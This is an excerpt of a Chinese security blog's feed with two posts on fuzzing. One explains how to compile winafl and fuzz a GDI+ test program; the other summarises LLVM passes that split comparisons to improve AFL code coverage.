     extra_env=extra_env)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;回顾与总览&quot;&gt;&lt;a href=&quot;#回顾与总览&quot; class=&quot;headerlink&quot; title=&quot;回顾与总览&quot;&gt;&lt;/a&gt;回顾与总览&lt;/h1&gt;&lt;p&gt;上一次我们选择了fuzz task的代码进行阅读，这次我们进一步深入，看看fuzz engine的选择&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="集群fuzz" scheme="https://www.giantbranch.cn/tags/%E9%9B%86%E7%BE%A4fuzz/"/>
    
      <category term="ClusterFuzz" scheme="https://www.giantbranch.cn/tags/ClusterFuzz/"/>
    
  </entry>
  
  <entry>
    <title>winafl编译与测试</title>
    <link href="https://www.giantbranch.cn/2020/12/25/winafl%E7%BC%96%E8%AF%91%E4%B8%8E%E6%B5%8B%E8%AF%95/"/>
    <id>https://www.giantbranch.cn/2020/12/25/winafl编译与测试/</id>
    <published>2020-12-25T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.130Z</updated>
    
    <content type="html"><![CDATA[<p>实验环境</p><blockquote><p>Visual Studio 2017 （你也可用更加新的版本）<br>git<br>perl<br>cmake<br>git<br>windows 10<br><a href="https://github.com/DynamoRIO/dynamorio/releases/download/release_8.0.0-1/DynamoRIO-Windows-8.0.0-1.zip" target="_blank" rel="noopener">DynamoRIO-Windows-8.0.0-1.zip</a> </p></blockquote><p>注意好像win10需要DynamoRIO 8.0.0以上</p><p>上面的都搞好后，下载winafl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/googleprojectzero/winafl.git</span><br></pre></td></tr></table></figure><p>编译32位，打开x86，64位打开x86_x64</p><p><img src="http://pic.giantbranch.cn/pic/1608889991589.png" alt></p><p>以64为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">D:\Program Files (x86)\Microsoft Visual Studio&gt;cd D:\Temp\test\winafl</span><br><span class="line"></span><br><span class="line">D:\Temp\test\winafl&gt;mkdir build64</span><br><span class="line"></span><br><span class="line">D:\Temp\test\winafl&gt;cd build64</span><br><span class="line"></span><br><span class="line">D:\Temp\test\winafl\build64&gt;cmake -G&quot;Visual Studio 15 2017&quot; -A x64 .. -DDynamoRIO_DIR=D:\Temp\DynamoRIO-Windows-8.0.0-1\cmake -DINTELPT=1</span><br><span class="line"></span><br><span class="line">D:\Temp\test\winafl\build64&gt;cmake --build . --config Release</span><br></pre></td></tr></table></figure><p>程序就在build64\bin\Release里面</p><p>使用test_gdiplus.exe进行测试，通过ida查看main函数是sub_1400010E0，偏移是0x10e0，这个编译器不同，偏移肯定不同</p><p>再搞一个1.bmp的测试文件</p><p>先用drrun测试一下，没有报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\Temp\DynamoRIO-Windows-8.0.0-1\bin64\drrun.exe -c winafl.dll -debug -target_module test_gdiplus.exe -target_offset 0x10e0 -fuzz_iterations 5 -nargs 2 -- test_gdiplus.exe 1.bmp</span><br></pre></td></tr></table></figure><p><img src="http://pic.giantbranch.cn/pic/1608890579428.png" alt></p><p>还生成了一个log，那基本应该没啥问题了</p><p><img src="http://pic.giantbranch.cn/pic/1608890646479.png" alt></p><p>那可以上afl了，新建一个in目录，放1.bmp进去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe -i in -o out -D D:\Temp\DynamoRIO-Windows-8.0.0-1\bin64\ -t 20000 -- -coverage_module gdiplus.dll -target_module test_gdiplus.exe -target_offset 0x10e0 -fuzz_iterations 20 -nargs 2 -- test_gdiplus.exe @@</span><br></pre></td></tr></table></figure><p><img src="http://pic.giantbranch.cn/pic/1608891063940.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;实验环境&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Visual Studio 2017 （你也可用更加新的版本）&lt;br&gt;git&lt;br&gt;perl&lt;br&gt;cmake&lt;br&gt;git&lt;br&gt;windows 10&lt;br&gt;&lt;a href=&quot;https://github.com/Dyna
      
    
    </summary>
    
    
      <category term="afl" scheme="https://www.giantbranch.cn/tags/afl/"/>
    
      <category term="winafl" scheme="https://www.giantbranch.cn/tags/winafl/"/>
    
  </entry>
  
  <entry>
    <title>通过编译器转换(llvm pass)规避模糊测试的一些障碍</title>
    <link href="https://www.giantbranch.cn/2020/09/08/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%99%A8%E8%BD%AC%E6%8D%A2(llvm%20pass)%E8%A7%84%E9%81%BF%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9A%9C%E7%A2%8D/"/>
    <id>https://www.giantbranch.cn/2020/09/08/通过编译器转换(llvm pass)规避模糊测试的一些障碍/</id>
    <published>2020-09-08T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.134Z</updated>
    
    <content type="html"><![CDATA[<p>这个是看一个文章的记录，算是简译吧</p><p>总的来说是通过llvm pass去优化代码的生成去提高AFL的代码覆盖率</p><p>AFL通过插桩获取的代码覆盖率，假如变异的样本触发的新的路径，就会加入到接下来的变异队列中</p><p>但是有一些情况，会给afl造成极大的障碍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (input == 0xabad1dea) &#123;</span><br><span class="line">  /* terribly buggy code */</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  /* secure code */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>afl是随机变异的，去变异生成一个完全一样的4字节的数，真是难于上青天</p><p>那怎么解决这个问题呢？</p><p>假如把上面的代码换成下面那样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if (input &gt;&gt; 24 == 0xab)&#123;</span><br><span class="line">  if ((input &amp; 0xff0000) &gt;&gt; 16 == 0xad) &#123;</span><br><span class="line">    if ((input &amp; 0xff00) &gt;&gt; 8 == 0x1d) &#123;</span><br><span class="line">      if ((input &amp; 0xff) == 0xea) &#123;</span><br><span class="line">        /* terrible code */</span><br><span class="line">        goto end;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* good code */</span><br><span class="line"></span><br><span class="line">end:</span><br></pre></td></tr></table></figure><p>现在一次比较一个字节，大大提升了中奖概率，从1/2^32降低到了1/2^9，即1/512</p><p>原文作者根据这个原理，把可能出现这个问题两种情况也写了pass：switch的选项，还有比较函数（memcmp，strcmp …）</p><h1 id="LLVM-Passes"><a href="#LLVM-Passes" class="headerlink" title="LLVM Passes"></a>LLVM Passes</h1><p>作者共实现了3个pass</p><p>比较指令的：split-compares-pass<br>strcmp和memcmp的： compare-transform-pass<br>switch的：split-switches-pass</p><h2 id="The-split-compares-pass"><a href="#The-split-compares-pass" class="headerlink" title="The split-compares-pass"></a>The split-compares-pass</h2><p>其实除了有==,还有!=,&gt;,&lt;,&gt;=,&lt;=</p><p>首先把&gt;=,&lt;=这种拆分为两个，比如&gt;=，一个是==，另一个是&gt;</p><p>再将有符号的比较拆分为，符号位比较和无符号的比较</p><p>到这就只剩这四种比较了：&lt;, &gt;, ==, != ，而且都是无符号的，所以再将字符拆分成单字节就好了</p><h2 id="The-compare-transform-pass"><a href="#The-compare-transform-pass" class="headerlink" title="The compare-transform-pass"></a>The compare-transform-pass</h2><p>原始</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!strcmp(directive, &quot;crash&quot;)) &#123;</span><br><span class="line">  programbug()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改成一个一个比较</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(directive[0] == &apos;c&apos;) &#123;</span><br><span class="line">  if(directive[1] == &apos;r&apos;) &#123;</span><br><span class="line">    if(directive[2] == &apos;a&apos;) &#123;</span><br><span class="line">      if(directive[3] == &apos;s&apos;) &#123;</span><br><span class="line">        if(directive[4] == &apos;h&apos;) &#123;</span><br><span class="line">          if(directive[5] == 0) &#123;</span><br><span class="line">            programbug()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>局限性：就是这个比较是文字字符串并且因此字符串本身及其长度在编译时已知</p><h2 id="The-split-switches-pass"><a href="#The-split-switches-pass" class="headerlink" title="The split-switches-pass"></a>The split-switches-pass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int x = userinput();</span><br><span class="line">switch(x) &#123;</span><br><span class="line">  case 0x11ff:</span><br><span class="line">    /* handle case 0x11ff */</span><br><span class="line">    break;</span><br><span class="line">  case 0x22ff:</span><br><span class="line">    /* handle case 0x22ff */</span><br><span class="line">    break;</span><br><span class="line">  default:</span><br><span class="line">    /* handle default */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思想是想转化为if else，之后在通过split-compares-pass来处理，但这可能不是生成最优代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">if (x &gt;&gt; 24 == 0x00)&#123;</span><br><span class="line">  if ((x &amp; 0xff0000) &gt;&gt; 16 == 0x00) &#123;</span><br><span class="line">    if ((x &amp; 0xff00) &gt;&gt; 8 == 0x11) &#123;</span><br><span class="line">      if ((x &amp; 0xff) == 0xff) &#123;</span><br><span class="line">        /* case 0x11ff */</span><br><span class="line">        goto after_switch;</span><br><span class="line">      &#125;</span><br><span class="line">      goto default_case;</span><br><span class="line">    &#125;</span><br><span class="line">    goto default_case;</span><br><span class="line">  &#125;</span><br><span class="line">  goto default_case;</span><br><span class="line">&#125;</span><br><span class="line">else if (x &gt;&gt; 24 == 0x00)&#123;</span><br><span class="line">  if ((x &amp; 0xff0000) &gt;&gt; 16 == 0x00) &#123;</span><br><span class="line">    if ((x &amp; 0xff00) &gt;&gt; 8 == 0x22) &#123;</span><br><span class="line">      if ((x &amp; 0xff) == 0xff) &#123;</span><br><span class="line">        /* case 0x22ff */</span><br><span class="line">        goto after_switch;</span><br><span class="line">      &#125;</span><br><span class="line">      goto default_case;</span><br><span class="line">    &#125;</span><br><span class="line">    goto default_case;</span><br><span class="line">  &#125;</span><br><span class="line">  goto default_case;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">default_case:</span><br><span class="line">  /* default case */</span><br><span class="line"></span><br><span class="line">after_switch:</span><br></pre></td></tr></table></figure><h1 id="评价"><a href="#评价" class="headerlink" title="评价"></a>评价</h1><p>作者还用libpng和harfbuzz对着几个pass进行了测试</p><h2 id="Driller的test-case"><a href="#Driller的test-case" class="headerlink" title="Driller的test case"></a>Driller的test case</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> 1 int main(void) &#123;</span><br><span class="line"> 2   config_t* config = readconfig();</span><br><span class="line"> 3   if(config == NULL)&#123;</span><br><span class="line"> 4     puts(&quot;Configuration syntax error&quot;);</span><br><span class="line"> 5     return 1;</span><br><span class="line"> 6   &#125;</span><br><span class="line"> 7   if (config-&gt;magic != MAGICNUMBER) &#123;</span><br><span class="line"> 8     puts(&quot;Bad magic number&quot;);</span><br><span class="line"> 9     return 2;</span><br><span class="line">10   &#125;</span><br><span class="line">11   initialize(config);</span><br><span class="line">12</span><br><span class="line">13   char* directive = config-&gt;directives[0];</span><br><span class="line">14   if(!strcmp(directive, &quot;crashstring&quot;)) &#123;</span><br><span class="line">15     programbug();</span><br><span class="line">16   &#125;</span><br><span class="line">17   else if(!strcmp(directive, &quot;setoption&quot;)) &#123;</span><br><span class="line">18     setoption(config-&gt;directives[1]);</span><br><span class="line">19   &#125;</span><br><span class="line">20   else&#123;</span><br><span class="line">21     _default();</span><br><span class="line">22   &#125;</span><br><span class="line">23 </span><br><span class="line">24   return 0;</span><br><span class="line">25 &#125;</span><br></pre></td></tr></table></figure><p>有了pass，1分钟就通过了第7行的检查，60分钟生成了crashstring，但是最后没出来setoption</p><p>没有pass，可能在合理的时间都过不了第7行的检查</p><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><p>作者将afl分为两组</p><p>组A：1个master，3个slave，都是正常插桩<br>组B：1个master，1个slave，都是正常插桩，还有另外的，1个master，1个slave，都是加了pass的</p><p>A组发现了1459条路径B找到了2318条路径。</p><p>在代码覆盖率方面（使用lcov进行度量的），A组命中了libpng的2186行，而B组命中了2707行</p><p>通过看图，可以看到加了pass，比较随便过</p><p><img src="http://pic.giantbranch.cn/pic/1599560602683.png" alt></p><p><img src="http://pic.giantbranch.cn/pic/1599560609259.png" alt></p><h2 id="harfbuzz"><a href="#harfbuzz" class="headerlink" title="harfbuzz"></a>harfbuzz</h2><p>harfbuzz的测试设置与libpng的设置相同，但是测试仅运行了24小时。在测试结束时，A组发现2070条路径，而B组发现2150条路径。在代码覆盖率方面，A组达到3358行，而B组达到3474行，增长了3.5％。</p><p><img src="http://pic.giantbranch.cn/pic/1599560550764.png" alt></p><p><img src="http://pic.giantbranch.cn/pic/1599560560518.png" alt></p><p>效果还是比较明显的</p><h1 id="参考原文"><a href="#参考原文" class="headerlink" title="参考原文"></a>参考原文</h1><p><a href="https://lafintel.wordpress.com/2016/08/15/circumventing-fuzzing-roadblocks-with-compiler-transformations/" target="_blank" rel="noopener">https://lafintel.wordpress.com/2016/08/15/circumventing-fuzzing-roadblocks-with-compiler-transformations/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个是看一个文章的记录，算是简译吧&lt;/p&gt;
&lt;p&gt;总的来说是通过llvm pass去优化代码的生成去提高AFL的代码覆盖率&lt;/p&gt;
&lt;p&gt;AFL通过插桩获取的代码覆盖率，假如变异的样本触发的新的路径，就会加入到接下来的变异队列中&lt;/p&gt;
&lt;p&gt;但是有一些情况，会给afl造成
      
    
    </summary>
    
    
      <category term="afl" scheme="https://www.giantbranch.cn/tags/afl/"/>
    
      <category term="fuzzing" scheme="https://www.giantbranch.cn/tags/fuzzing/"/>
    
      <category term="llvm pass" scheme="https://www.giantbranch.cn/tags/llvm-pass/"/>
    
  </entry>
  
</feed>
